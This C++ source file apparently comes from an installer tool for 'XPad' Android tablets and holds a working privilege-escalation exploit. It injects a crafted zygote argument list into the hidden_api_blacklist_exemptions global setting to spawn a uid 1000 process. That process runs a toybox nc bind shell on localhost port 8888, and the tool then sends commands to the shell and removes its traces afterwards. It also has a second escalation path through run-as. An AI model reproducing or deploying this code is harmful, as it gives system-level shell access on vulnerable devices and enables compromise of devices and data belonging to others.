#include "xpad_activation.h"

#include <arpa/inet.h>
#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fcntl.h>
#include <string>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <unistd.h>

namespace {

constexpr const char *HIDDEN_SETTING = "hidden_api_blacklist_exemptions";
constexpr int ZYGOTE_PORT = 8888;
constexpr int NEWLINE_COUNT = 3000;
constexpr int DELAY_PAIRS = 1400;

int write_all(int fd, const void *data, size_t length) {
    const auto *current = static_cast<const unsigned char *>(data);
    while (length > 0) {
        ssize_t written = write(fd, current, length);
        if (written < 0 && errno == EINTR) continue;
        if (written <= 0) return -1;
        current += written;
        length -= static_cast<size_t>(written);
    }
    return 0;
}

int connect_localhost(int port) {
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0) return -1;

    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_port = htons(static_cast<uint16_t>(port));
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (connect(fd, reinterpret_cast<sockaddr *>(&address), sizeof(address)) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

int run_command(char *const argv[], bool quiet = false) {
    pid_t pid = fork();
    if (pid < 0) return 127;
    if (pid == 0) {
        if (quiet) {
            int dev_null = open("/dev/null", O_RDWR | O_CLOEXEC);
            if (dev_null >= 0) {
                dup2(dev_null, STDOUT_FILENO);
                dup2(dev_null, STDERR_FILENO);
                if (dev_null > STDERR_FILENO) close(dev_null);
            }
        }
        execv(argv[0], argv);
        _exit(127);
    }

    int status = 0;
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR) return 127;
    }
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
    return 127;
}

int settings_delete() {
    char *const argv[] = {
            const_cast<char *>("/system/bin/settings"),
            const_cast<char *>("delete"),
            const_cast<char *>("global"),
            const_cast<char *>(HIDDEN_SETTING),
            nullptr,
    };
    return run_command(argv, true);
}

std::string build_zygote_payload() {
    constexpr const char *arguments[] = {
            "--runtime-args",
            "--setuid=1000",
            "--setgid=1000",
            "--setgroups=3003",
            "--mount-external-android-writable",
            "--runtime-flags=43267",
            "--target-sdk-version=29",
            "--seinfo=platform:system_app:targetSdkVersion=29:complete",
            "--invoke-with",
            "(toybox nc -s 127.0.0.1 -p 8888 -L /system/bin/sh -l)&",
            "--package-name=com.android.settings",
            "android.app.ActivityThread",
    };

    std::string zygote_command = std::to_string(sizeof(arguments) / sizeof(arguments[0]));
    zygote_command.push_back('\n');
    for (size_t i = 0; i < sizeof(arguments) / sizeof(arguments[0]); ++i) {
        zygote_command.append(arguments[i]);
        if (i + 1 != sizeof(arguments) / sizeof(arguments[0])) zygote_command.push_back('\n');
    }

    int header_length = snprintf(nullptr, 0, "--set-api-denylist-exemptions %d\n", NEWLINE_COUNT);
    size_t newlines = NEWLINE_COUNT + 5;
    size_t padding = 8192 - static_cast<size_t>(header_length) - newlines;

    std::string payload(newlines, '\n');
    payload.append(padding, 'A');
    payload.append(zygote_command);
    payload.push_back(',');
    for (int i = 0; i < DELAY_PAIRS; ++i) payload.append(",\n");
    return payload;
}

int settings_put(const std::string &payload) {
    char *const argv[] = {
            const_cast<char *>("/system/bin/settings"),
            const_cast<char *>("put"),
            const_cast<char *>("global"),
            const_cast<char *>(HIDDEN_SETTING),
            const_cast<char *>(payload.c_str()),
            nullptr,
    };
    return run_command(argv, true);
}

void force_stop_settings() {
    char *const argv[] = {
            const_cast<char *>("/system/bin/am"),
            const_cast<char *>("force-stop"),
            const_cast<char *>("com.android.settings"),
            nullptr,
    };
    run_command(argv, true);
}

void start_settings() {
    char *const argv[] = {
            const_cast<char *>("/system/bin/am"),
            const_cast<char *>("start"),
            const_cast<char *>("-n"),
            const_cast<char *>("com.android.settings/.Settings"),
            nullptr,
    };
    run_command(argv, true);
}

int acquire_system_runner() {
    int existing = connect_localhost(ZYGOTE_PORT);
    if (existing >= 0) {
        close(existing);
        return 0;
    }

    const std::string payload = build_zygote_payload();
    for (int attempt = 1; attempt <= 3; ++attempt) {
        settings_delete();
        force_stop_settings();
        if (settings_put(payload) != 0) {
            settings_delete();
            return -1;
        }

        sleep(2);
        for (int poll = 0; poll < 12; ++poll) {
            int fd = connect_localhost(ZYGOTE_PORT);
            if (fd >= 0) {
                close(fd);
                settings_delete();
                return 0;
            }
            if (poll == 0) start_settings();
            sleep(1);
        }
        fprintf(stderr, "warn: XPad 31317 attempt %d failed\n", attempt);
    }
    settings_delete();
    return -1;
}

std::string shell_quote(const char *value) {
    std::string result("'");
    for (; *value != '\0'; ++value) {
        if (*value == '\'') {
            result.append("'\\''");
        } else {
            result.push_back(*value);
        }
    }
    result.push_back('\'');
    return result;
}

int rpc(const std::string &command, int timeout_seconds) {
    int fd = connect_localhost(ZYGOTE_PORT);
    if (fd < 0) return 127;

    timeval timeout{timeout_seconds, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    std::string marker = "__BOOMINSTALLER_DONE_" + std::to_string(getpid()) + "__";
    std::string request = command + "; RC=$?; echo " + marker + "$RC\n";
    if (write_all(fd, request.data(), request.size()) != 0) {
        close(fd);
        return 125;
    }
    shutdown(fd, SHUT_WR);

    std::string response;
    char buffer[4096];
    for (;;) {
        ssize_t length = read(fd, buffer, sizeof(buffer));
        if (length < 0 && errno == EINTR) continue;
        if (length <= 0) break;
        response.append(buffer, static_cast<size_t>(length));
        size_t marker_position = response.find(marker);
        size_t result_end = marker_position == std::string::npos
                ? std::string::npos
                : response.find('\n', marker_position + marker.size());
        if (result_end != std::string::npos) {
            write_all(STDOUT_FILENO, response.data(), marker_position);
            int result = atoi(response.c_str() + marker_position + marker.size());
            close(fd);
            return result;
        }
    }

    write_all(STDOUT_FILENO, response.data(), response.size());
    close(fd);
    return 124;
}

void cleanup_system_runner() {
    int fd = connect_localhost(ZYGOTE_PORT);
    if (fd >= 0) {
        constexpr const char command[] =
                "ME=$$; PARENT=$PPID; "
                "GP=$(awk '/^PPid:/ {print $2}' /proc/$PARENT/status 2>/dev/null); "
                "settings delete global hidden_api_blacklist_exemptions >/dev/null 2>&1; "
                "kill -9 $GP $PARENT >/dev/null 2>&1\n";
        write_all(fd, command, sizeof(command) - 1);
        shutdown(fd, SHUT_WR);
        close(fd);
        sleep(1);
    }
    settings_delete();
}

bool znxrun_can_deliver_binder() {
    char *const probe[] = {
            const_cast<char *>("/system/bin/run-as"),
            const_cast<char *>("znxrun"),
            const_cast<char *>("/system/bin/true"),
            nullptr,
    };
    if (run_command(probe, true) != 0) return false;

    FILE *packages = popen(
            "/system/bin/dumpsys package com.tal.pad.znxxservice 2>/dev/null", "r");
    if (!packages) return false;

    bool granted = false;
    char line[1024];
    while (fgets(line, sizeof(line), packages)) {
        if (strstr(line, "android.permission.ACCESS_CONTENT_PROVIDERS_EXTERNALLY") &&
            strstr(line, "granted=true")) {
            granted = true;
            break;
        }
    }
    pclose(packages);
    return granted;
}

int activate_as_znxrun(const char *starter_path, const char *apk_path) {
    std::string apk_argument = "--apk=" + std::string(apk_path);
    char *const argv[] = {
            const_cast<char *>("/system/bin/run-as"),
            const_cast<char *>("znxrun"),
            const_cast<char *>(starter_path),
            const_cast<char *>(apk_argument.c_str()),
            nullptr,
    };
    printf("info: activating BoomInstaller as uid 10072 (0044)\n");
    fflush(stdout);
    return run_command(argv);
}

int activate_as_system(const char *starter_path, const char *apk_path) {
    printf("info: activating BoomInstaller as uid 1000 (31317)\n");
    fflush(stdout);
    if (acquire_system_runner() != 0) {
        fprintf(stderr, "fatal: cannot acquire the XPad uid 1000 runner\n");
        return 77;
    }

    std::string apk_argument = "--apk=" + std::string(apk_path);
    std::string command = shell_quote(starter_path) + " " + shell_quote(apk_argument.c_str());
    int result = rpc(command, 60);
    cleanup_system_runner();
    return result;
}

}  // namespace

namespace xpad {

int activate(const char *starter_path, const char *apk_path) {
    if (znxrun_can_deliver_binder()) {
        int result = activate_as_znxrun(starter_path, apk_path);
        if (result == 0) return 0;
        fprintf(stderr, "warn: XPad 0044 activation failed; trying uid 1000\n");
    }
    return activate_as_system(starter_path, apk_path);
}

}  // namespace xpad
